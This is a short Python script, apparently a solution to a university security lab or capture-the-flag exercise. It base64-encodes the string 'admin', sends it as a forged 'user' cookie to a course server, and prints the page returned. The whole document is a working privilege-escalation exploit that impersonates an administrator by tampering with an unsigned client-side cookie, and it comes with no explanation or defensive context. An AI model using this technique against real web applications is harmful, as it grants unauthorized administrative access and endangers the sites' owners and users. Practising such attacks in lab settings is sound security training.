import requests
import base64

URL = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22056/"

adminEnconded = base64.b64encode(b"admin").decode("utf-8")
r = requests.get(URL, cookies={'user': adminEnconded})
print(r.text)